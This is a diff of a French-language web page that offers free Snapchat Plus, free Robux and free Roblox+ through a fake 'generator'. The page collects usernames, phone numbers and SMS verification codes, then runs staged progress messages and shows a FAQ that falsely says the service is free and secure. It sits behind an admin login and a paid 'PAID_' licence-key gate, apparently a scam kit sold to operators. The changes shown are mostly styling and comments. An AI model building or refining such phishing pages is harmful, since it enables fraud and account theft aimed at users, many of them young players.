@@ -81,46 +81,49 @@
         }
 
         .login-title {
-            font-size: 21px; font-weight: 900; margin-bottom: 30px; letter-spacing: 1px;
+            font-size: 23px; font-weight: 900; margin-bottom: 30px; letter-spacing: 1px;
             text-transform: uppercase;
             background: linear-gradient(to right, var(--primary), var(--secondary));
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        /* --- SIZES CORRIGÉES ET ALIGNÉES SUR LES BOUTONS --- */
+        /* --- CHAMP IDENTIFIANT ET MOT DE PASSE (CALIBRAGE STRICT) --- */
         .login-input-group {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 50px;
-            margin-bottom: 15px;
-            padding: 15px 20px; /* Même espacement vertical que le bouton Mode Démonstration */
-            display: flex;
-            align-items: center;
-            border: 1px solid rgba(255, 255, 255, 0.1); /* Même épaisseur de bordure */
+            background: rgba(0, 0, 0, 0.3); 
+            border-radius: 50px; 
+            margin-bottom: 15px; 
+            height: 50px; /* HAUTEUR FIXE EXACTE */
+            padding: 0 20px;
+            display: flex; 
+            align-items: center; 
+            border: 1px solid rgba(255, 255, 255, 0.1); /* ÉPAISSEUR IDENTIQUE AUX BOUTONS */
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
-            box-sizing: border-box;
+            box-sizing: border-box; /* EMPECHE LE DÉBORDEMENT */
         }
         .login-input-group:focus-within {
-            border-color: var(--primary);
-            box-shadow: 0 0 10px var(--shadow-glow);
+            border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow);
         }
-        .login-input-group svg {
-            width: 18px;
-            height: 18px;
-            fill: rgba(255, 255, 255, 0.6);
+        .login-input-group svg { 
+            width: 18px; 
+            height: 18px; 
+            fill: rgba(255, 255, 255, 0.6); 
             margin-right: 12px;
             flex-shrink: 0;
         }
         .login-input-group input {
-            background: transparent;
-            border: none;
-            color: white;
-            padding: 0; /* Supprime l'accumulation d'espacement */
-            width: 100%;
-            outline: none;
-            font-size: 14px; /* Même taille de police que le bouton Mode Démonstration */
+            background: transparent; 
+            border: none; 
+            color: white; 
+            padding: 0; 
+            margin: 0; 
+            width: 100%; 
+            height: 100%; /* REMPLIT EXACTEMENT LA HAUTEUR */
+            outline: none; 
+            font-size: 14px; /* TAILLE IDENTIQUE AUX BOUTONS */
         }
         .login-input-group input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
+        /* --- BOUTON DE CONNEXION PRINCIPAL --- */
         .btn-login, .btn-glow, .btn-return {
             width: 100%;
             background: linear-gradient(135deg, var(--primary), var(--secondary));
@@ -134,11 +137,23 @@
         }
         .btn-login:disabled, .btn-glow:disabled, .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
+        /* --- BOUTONS INVITÉ ET DEMO (CALIBRAGE STRICT) --- */
         .btn-guest, .btn-demo-direct {
-            width: 100%; background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50px; padding: 15px; color: rgba(255, 255, 255, 0.6);
-            margin-top: 15px; font-size: 14px; cursor: pointer; transition: all 0.3s ease;
-            box-sizing: border-box;
+            width: 100%; 
+            height: 50px; /* HAUTEUR FIXE EXACTE - IDENTIQUE AUX CHAMPS */
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            background: transparent; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 50px; 
+            padding: 0; 
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 15px; 
+            font-size: 14px; /* TAILLE IDENTIQUE AUX CHAMPS */
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            box-sizing: border-box; /* EMPECHE LE DÉBORDEMENT */
         }
         .btn-guest:hover, .btn-demo-direct:hover {
             color: white; border-color: var(--primary); background: rgba(255, 255, 255, 0.05);
@@ -208,7 +223,7 @@
 
         .title { color: var(--text-glow); font-size: 24px; font-weight: 900; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; transition: color 0.8s ease; }
 
-        /* --- INPUTS DU SITE --- */
+        /* --- INPUTS --- */
         .input-group { 
             display: flex; border: 2px solid var(--border-glow); border-radius: 12px; 
             margin-bottom: 20px; background-color: rgba(0,0,0,0.3); align-items: center; overflow: hidden;
@@ -323,8 +338,10 @@
 </head>
 <body>
 
+    <!-- EFFET ÉTOILES POUR THEME ROBLOX -->
     <div class="stars-bg"></div>
 
+    <!-- OVERLAY CONNEXION -->
     <div id="login-overlay">
         <div class="glass-panel">
             <h2 class="login-title">Connexion administrateur</h2>
@@ -345,21 +362,25 @@
         </div>
     </div>
 
+    <!-- CONTENU PRINCIPAL -->
     <div id="main-site">
         <div class="container">
             
             <div id="admin-badge" class="admin-badge"></div>
 
+            <!-- MENU GLOBAL -->
             <div class="switcher-container">
                 <div class="switch-btn active" id="btn-snap" onclick="setService('snap')">Snapchat</div>
                 <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">Roblox</div>
             </div>
 
+            <!-- SOUS-MENU ROBLOX -->
             <div class="switcher-container" id="sub-switcher-container">
                 <div class="switch-btn active" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
                 <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox+</div>
             </div>
 
+            <!-- LOGO DYNAMIQUE -->
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="logo-bg" id="logo-bg">
@@ -371,6 +392,7 @@
 
             <h1 class="title" id="main-title">ACTIVATION SNAP<br>PLUS +</h1>
 
+            <!-- ÉTAPE 1 : FORMULAIRE -->
             <div id="step-1">
                 <div class="input-group" id="group-username">
                     <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" maxlength="50">
@@ -388,12 +410,14 @@
                         <div class="select-arrow"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></div>
                     </div>
                     <div class="custom-select-options" id="offer-options">
-                        </div>
+                        <!-- Rempli dynamiquement via JS -->
+                    </div>
                 </div>
 
                 <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
             </div>
 
+            <!-- ÉTAPE 2 : SMS -->
             <div id="step-2" style="display: none;">
                 <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
                 <div class="sms-subtext" id="timer">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
@@ -404,6 +428,7 @@
                 <button class="btn-return" onclick="goBackToStep1()">Retour</button>
             </div>
 
+            <!-- ÉTAPE 3 : CHARGEMENT -->
             <div id="step-3" style="display: none;">
                 <div class="status-box" id="status-container">
                     <div id="progress-area" style="width: 100%; text-align: center;">
@@ -425,10 +450,12 @@
                 </p>
             </div>
 
+            <!-- FAQ DYNAMIQUE -->
             <div class="faq-section">
                 <div class="faq-title">FAQ</div>
                 <div id="faq-list">
-                    </div>
+                    <!-- Rempli dynamiquement via JS -->
+                </div>
             </div>
 
             <div class="footer-contact">
@@ -492,7 +519,7 @@
                         { value: "3150", text: "3 150 Robux" },
                         { value: "4500", text: "4 500 Robux" }
                     ],
-                    loaderHtml: '<img src="loader_robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
                     successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
                     progressSteps: [
                         { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
@@ -519,7 +546,7 @@
                         { value: "3", text: "3 mois Premium" },
                         { value: "12", text: "12 mois Premium" }
                     ],
-                    loaderHtml: '<img src="loader_robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
+                    loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
                     successMsg: "L'abonnement Roblox+ sera activé sur votre compte d'ici quelques instants.",
                     progressSteps: [
                         { width: "20%", text: "Connexion sécurisée aux serveurs Roblox..." },
@@ -531,7 +558,7 @@
                     faq: [
                         { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles." },
                         { q: "Quels sont les avantages de Roblox+ ?", a: "Roblox+ vous donne accès à des fonctionnalités premium exclusives sur la plateforme." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire pour vérifier votre identity humaine et sécuriser l'attribution de l'abonnement." }
+                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire pour vérifier votre identité humaine et sécuriser l'attribution de l'abonnement." }
                     ]
                 }
             }
@@ -543,13 +570,15 @@
         function setService(service) {
             currentService = service;
             
+            // Gestion UI Boutons Principaux
             document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
             document.getElementById('btn-roblox').classList.toggle('active', service === 'roblox');
             
+            // Gestion d'affichage Sous-Menu
             const subMenu = document.getElementById('sub-switcher-container');
             if (service === 'roblox') {
                 subMenu.style.display = 'flex';
-                setSubService('robux'); 
+                setSubService('robux'); // Par défaut
             } else {
                 subMenu.style.display = 'none';
                 applyConfig();
@@ -573,6 +602,7 @@
                 document.body.className = 'theme-roblox';
             }
 
+            // Textes et Images
             document.getElementById('main-title').innerHTML = activeConfig.title;
             
             const logoImg = document.getElementById('main-logo');
@@ -585,6 +615,7 @@
             document.getElementById('plus-badge').textContent = activeConfig.plusText;
             document.getElementById('username').placeholder = activeConfig.userPlaceholder;
             
+            // Sélecteur
             const offerLabel = document.getElementById('offer-label');
             offerLabel.textContent = activeConfig.selectLabel;
             offerLabel.style.color = "rgba(255, 255, 255, 0.5)";
@@ -601,8 +632,10 @@
                 optionsContainer.appendChild(div);
             });
 
+            // Loader dynamique
             document.getElementById('loader-container').innerHTML = activeConfig.loaderHtml;
 
+            // FAQ Dynamique
             const faqList = document.getElementById('faq-list');
             faqList.innerHTML = '';
             activeConfig.faq.forEach(item => {
@@ -618,7 +651,7 @@
         }
 
         // ==========================================
-        // 3. LOGIQUE D'APPLICATION SÉCURISÉE
+        // 3. LOGIQUE D'APPLICATION
         // ==========================================
         let isGuest = false;
 
@@ -667,7 +700,7 @@
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
-                applyConfig(); 
+                applyConfig(); // Init Config
                 setTimeout(() => { 
                     site.style.opacity = "1"; 
                     if (isGuest) showKeyAccessPopup();
@@ -685,9 +718,9 @@
                     <h3 style="color:var(--primary); font-size: 20px; font-weight: 900; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
                     <p style="margin-bottom: 25px; line-height: 1.5; color: rgba(255,255,255,0.8); font-size: 14px;">Veuillez saisir votre clé d'accès (PAID_) pour authentifier la session.</p>
                     <div class="login-input-group" id="group-key-input" style="margin-bottom: 20px; background: rgba(0, 0, 0, 0.5);">
-                        <input type="text" id="licence-key" placeholder="PAID_xxxxxxxx" style="text-align: center; font-family: monospace; letter-spacing: 1px; font-size: 14px;" autocomplete="off">
+                        <input type="text" id="licence-key" placeholder="PAID_xxxxxxxx" style="text-align: center; font-family: monospace; letter-spacing: 1px; font-size: 15px;" autocomplete="off">
                     </div>
-                    <button class="btn-glow" style="margin-bottom: 15px; padding: 15px; font-size: 14px; border-radius: 50px;" onclick="validateLicenceKey()">Valider</button>
+                    <button class="btn-glow" style="margin-bottom: 15px; padding: 16px; font-size: 15px; border-radius: 50px;" onclick="validateLicenceKey()">Valider</button>
                     <button class="btn-guest" style="margin-top: 0; color: rgba(255, 255, 255, 0.4); border-color: rgba(255, 255, 255, 0.1);" onclick="location.reload()">Retour à l'accueil</button>
                 </div>
             `;
@@ -699,6 +732,7 @@
             if(!keyInput.startsWith("PAID_")) {
                 triggerShake('group-key-input'); showError("❌ Format de clé invalide."); return;
             }
+            // Simulation validation DB (Mode test accepté ici)
             if(keyInput === "PAID_DEMO123") {
                 document.getElementById('key-popup-access').remove();
                 isGuest = false; showError("✅ Clé valide. Accès autorisé !");
@@ -790,6 +824,7 @@
             const pb = document.getElementById('pb');
             const msg = document.getElementById('status-msg');
             
+            // Récupère les textes de chargement selon la config actuelle
             const activeConfig = currentService === 'snap' ? siteConfig.snap : siteConfig.roblox[currentSubService];
             const steps = activeConfig.progressSteps;
 
@@ -831,24 +866,8 @@
             document.getElementById('verifyBtn').innerHTML = "Vérifier";
             document.getElementById('verifyBtn').disabled = false;
             
-            applyConfig();
+            applyConfig(); // Reset le select
         }
-
-        // --- ENTRÉE PAR TOUCHE TOUJOURS ACTIVE ---
-        document.addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') {
-                const activeElement = document.activeElement;
-                if (activeElement.id === 'adminUser' || activeElement.id === 'adminPass') {
-                    checkLogin();
-                } else if (activeElement.id === 'licence-key') {
-                    validateLicenceKey();
-                } else if (activeElement.id === 'username' || activeElement.id === 'phone') {
-                    processValidation();
-                } else if (activeElement.id === 'sms-code') {
-                    showWaitingMenu();
-                }
-            }
-        });
     </script>
 </body>
 </html>
